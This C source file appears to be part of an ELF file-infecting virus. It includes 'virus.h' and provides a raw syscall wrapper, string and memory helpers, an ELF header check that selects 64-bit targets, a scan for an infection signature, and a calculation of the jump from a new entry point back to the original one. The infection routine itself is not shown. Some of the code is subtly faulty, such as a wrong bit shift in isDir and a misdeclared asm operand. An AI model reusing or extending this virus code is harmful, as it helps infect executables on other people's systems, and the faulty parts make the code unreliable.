#include "virus.h"

unsigned long int ft_syscall(void *arg1, void *arg2, void *arg3, void *arg4, void *arg5) {
    unsigned long int result;

    asm (
        "mov rax, %0\n"
        "mov rdi, %1\n"
        "mov rsi, %2\n"
        "mov rdx, %3\n"
        "mov rcx, %4\n"
        "syscall\n"
        :
        : "m" (arg1), "m" (arg2), "m" (arg3), "m" (arg4), "m" (arg5)
        : "rax", "rdi", "rsi", "rdx", "rcx"
    );
    asm (
        "mov %0, rax\n"
        :
        : "m" (result)
    );
    return (result);
}

unsigned long int	ft_strlen(const char *str) {
	unsigned long int i;

	i = 0;
	while (str[i] != '\0')
		i++;
	return (i);
}


int ft_strcat(char *dst, char *src) {
    unsigned long int len_dst;
    unsigned long int i = 0;

    if (!dst || !src)
        return (1);
    len_dst = ft_strlen(dst);
    while (src[i]) {
        dst[len_dst + i] = src[i];
        i++;
    }
    dst[len_dst + i] = 0;
    return 0;
}

int	ft_strcmp(const char *s1, const char *s2) {
	int	i = 0;

	while (s1[i] || s2[i])
	{
		if (s1[i] != s2[i])
			return ((unsigned char)s1[i] - (unsigned char)s2[i]);
		i++;
	}
	return (0);
}

int memncat(void *src, unsigned long int index, void *dst, unsigned long int n) {
    unsigned long int i = -1;
    
    while (++i < n)
        ((unsigned char *)src)[index + i] = ((unsigned char *)dst)[i];
    return (0);
}

void	*ft_memset(void *s, int c, unsigned long int n) {
	unsigned long int i;
	unsigned char	*tab;

	tab = (unsigned char *)s;
	i = 0;
	while (i < n) {
		*(tab + i) = c;
		i++;
	}
	return (s);
}

int check_file(struct ELFheaders64 fHdr) {
    unsigned int ref_bytes = 1179403647;

    if (fHdr.ei_mag0 != ref_bytes)
        return (1);
    else if (fHdr.ei_class != 2)
        return (1);
    else if (fHdr.ei_data != 1)
        return (1);
    else if (fHdr.ei_osabi != 0)
        return (1);
    return (0);
}

unsigned char	ft_strstr(const char *str, const char *need, unsigned long int len)
{
	unsigned long int i;
	unsigned long int j;

	i = 0;
	while (i < len) {
		j = 0;
		while ((i + j) < len && (str[i + j] == need[j])) {
			if (need[j + 1] == 0)
				return (1);
			j++;
		}
		i++;
	}
	return (0);
}


int checkSignature(int fd, const char *signature) {
    unsigned long int bytes_rd;
    char buff[0x1000];

    do {
        ft_memset(buff, 0, 0x1000);
        bytes_rd = ft_syscall(READ, (void *)fd, buff, (void *)0x1000, 0);
        if (ft_strstr(buff, signature, 0x1000) == 1)
            return (1);
    }
    while(bytes_rd > 0);
    return (0);
}


unsigned char isDir(const char *path) {
    unsigned char buf[144];
    unsigned int mode;

    if ((int)ft_syscall(STAT, (void *)path, buf, 0, 0) != 0)
        return (2);
    mode = ((buf[24 + 0x00] & 0xFF)) | ((buf[24 + 0x01] & 0xFF) << 8) | ((buf[24 + 0x02] & 0xFF) << 24) | ((buf[24 + 0x03] & 0xFF) << 24);
    return (S_ISDIR(mode));
}

int find_offset_nentry_oentry(unsigned long int oep, unsigned long int nep) {
    int offset = 0xFFFFFFFF;
    int diff;

    diff = oep < nep ? (int)(nep - oep) : (int)(oep - nep);
    offset = offset - diff;
    return (offset + 1);
}